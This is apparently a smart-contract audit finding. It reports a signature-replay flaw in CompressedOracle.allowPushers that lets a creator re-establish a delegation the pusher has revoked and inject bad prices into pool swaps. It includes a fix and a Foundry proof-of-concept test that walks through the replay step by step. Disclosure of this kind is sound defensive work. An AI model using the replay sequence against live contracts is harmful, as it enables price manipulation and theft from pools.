### Title
`allowPushers` Signature Replay Allows Creator to Silently Re-Establish Revoked Pusher Delegation, Injecting Bad Prices into Pools - (File: `smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

### Summary

`CompressedOracle.allowPushers` accepts a deadline-bound EIP-191 signature as the pusher's consent but tracks no per-signature nonce or used-signature set. A creator who holds a valid (non-expired) consent signature can call `allowPushers` repeatedly with the same signature, re-establishing `namespaceRemapping[pusher] = creator` immediately after the pusher calls `revokePusher()`. The pusher's revocation is therefore completely ineffective until the original deadline expires. Any pushes the pusher makes after revocation — believing they are writing to their own namespace — silently land in the creator's namespace instead, injecting whatever price data the pusher is now producing (potentially for a different asset or at a different cadence) into the oracle feeds consumed by live pool swaps.

### Finding Description

`allowPushers` constructs the signed digest as:

```solidity
keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
```

and verifies `pusher == ECDSA.recover(hash, signatures[i])`, then unconditionally writes:

```solidity
namespaceRemapping[pusher] = msg.sender;
``` [1](#0-0) 

There is no nonce, no used-signature bitmap, and no check that `namespaceRemapping[pusher]` is already zero before writing. The deadline is a future Unix timestamp, not a one-time-use token. The same `(deadline, pusher, creator, sig)` tuple passes `_ensureDeadline` and `ECDSA.recover` on every call until `block.timestamp > deadline`.

`revokePusher` clears the mapping:

```solidity
namespaceRemapping[msg.sender] = address(0);
``` [2](#0-1) 

But the creator can immediately call `allowPushers` again with the identical signature, restoring `namespaceRemapping[pusher] = creator` in the same block. The code comment on `allowPushers` explicitly acknowledges the risk ("an undated signature could re-establish a delegation AFTER the pusher revoked it") and claims the deadline is the mitigation — but the deadline only bounds the replay window; it does not prevent replay within that window. [3](#0-2) 

The `fallback` push path resolves the namespace at call time:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [4](#0-3) 

So every push the pusher makes after their (ineffective) revocation lands in the creator's namespace, not the pusher's own.

### Impact Explanation

The corrupted value is `namespaceRemapping[pusher]`, which is re-set to `creator` after the pusher cleared it. Every subsequent fallback push from the pusher writes into the creator's namespace slots. `CompressedOracle.price` and `getOracleData` read those slots directly: [5](#0-4) 

`AnchoredPriceProvider._readLeg` calls `IPricedOracle(address(offchainOracle)).price(feedId, msg.sender)` and uses the returned `mid` and `spreadBps` to compute the bid/ask band delivered to the pool swap: [6](#0-5) 

If the pusher, believing they have revoked, begins pushing data for a different asset or at a different scale into what they think is their own namespace, those values reach the pool's swap execution as the oracle mid price. A sufficiently wrong mid causes the pool to execute swaps at an incorrect bid/ask, resulting in a trader receiving more output than the true market rate permits (swap conservation failure) or the pool receiving less input than owed.

### Likelihood Explanation

The trigger requires a creator (semi-trusted, not the oracle admin) to hold a non-expired consent signature and to call `allowPushers` again after the pusher revokes. This is a low-friction, single-transaction action. The pusher has no on-chain way to detect the re-establishment without monitoring `namespaceRemapping` events. Consent signatures are typically issued with multi-day or multi-week deadlines (the test suite uses `block.timestamp + 1 days`), giving the creator a wide replay window. The pusher cannot shorten this window — they cannot invalidate the signature itself.

### Recommendation

Track used signatures with a per-pusher nonce or a `mapping(bytes32 => bool) usedSignatures` set. Before writing `namespaceRemapping[pusher] = msg.sender`, mark the digest as consumed and revert if it has already been used:

```solidity
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
);
require(!usedSignatures[hash], "signature already consumed");
require(pusher == ECDSA.recover(hash, signatures[i]));
usedSignatures[hash] = true;
namespaceRemapping[pusher] = msg.sender;
```

Alternatively, include a per-pusher nonce in the signed digest and increment it on each successful delegation, making every prior signature invalid after the first use.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {CompressedOracleV1} from "contracts/oracles/compressed/CompressedOracle.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract ReplayDelegationTest is Test {
    CompressedOracleV1 oracle;

    uint256 constant PUSHER_KEY = 0xBEEF;
    address pusher;
    address creator = address(0xC0FFEE);

    function setUp() public {
        oracle = new CompressedOracleV1(address(this), 0);
        pusher = vm.addr(PUSHER_KEY);
        vm.warp(1_700_000_000);
    }

    function testRevokeIsIneffectiveDueToSignatureReplay() public {
        uint256 deadline = block.timestamp + 1 days;

        // Pusher signs consent for creator
        bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        address[] memory pushers = new address[](1);
        pushers[0] = pusher;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sig;

        // Step 1: Creator establishes delegation
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator, "delegated");

        // Step 2: Pusher revokes
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0), "revoked");

        // Step 3: Creator replays the SAME signature — revocation is undone
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator,
            "FAIL: revocation was ineffective; pusher is re-delegated to creator");

        // Step 4: Pusher's subsequent push (intended for own namespace) lands in creator's namespace
        uint56 tsMs = uint56(block.timestamp * 1000);
        uint256 word = (uint256(tsMs) << 8) | uint256(0); // slotId=0
        uint48 badPrice = (uint48(9_999_999) << 16) | (uint48(5) << 8) | uint48(5);
        word |= uint256(badPrice) << 208;

        vm.prank(pusher);
        (bool ok,) = address(oracle).call(abi.encodePacked(word));
        assertTrue(ok);

        // Bad price is now readable from creator's namespace — feeds into pool swaps
        IOffchainOracle.OracleData memory data =
            oracle.getOracleData(oracle.feedIdOf(creator, 0, 0));
        assertGt(data.price, 0, "bad price injected into creator namespace");
    }
}
```

Run with:
```
forge test --mt testRevokeIsIneffectiveDueToSignatureReplay -vvvv
```

The test demonstrates that after `revokePusher()`, the creator replays the original consent signature in the same block, restoring the delegation. The pusher's next push — intended for their own namespace — lands in the creator's namespace and is returned by `getOracleData(feedIdOf(creator, ...))`, which is the exact value `AnchoredPriceProvider` consumes during pool swaps.

    function _readLeg(bytes32 feedId)
        internal returns (uint256 mid, uint256 spreadBps, uint256 refTime, bool ok)
    {
        (mid, spreadBps, , refTime) = IPricedOracle(address(offchainOracle)).price(feedId, msg.sender);

        // Stale reference → not ok. Clamping to a stale anchor is the one false-safety case.
        if (_isStale(refTime, block.timestamp, MAX_REF_STALENESS)) return (mid, spreadBps, refTime, false);

        // Basic validity — mid positive, spreadBps not the stalled/off-hours marker (the Chainlink oracle
        // writes spreadBps = ORACLE_BPS when an RWA market is closed).
        if (mid == 0 || spreadBps >= ORACLE_BPS) return (mid, spreadBps, refTime, false);

        // Per-leg price guard.
        (uint128 guardMin, uint128 guardMax) = offchainOracle.priceGuard(feedId);
        guardMax = guardMax == 0 ? type(uint128).max : guardMax;
        if (mid < guardMin || mid > guardMax) return (mid, spreadBps, refTime, false);

        ok = true;
    }
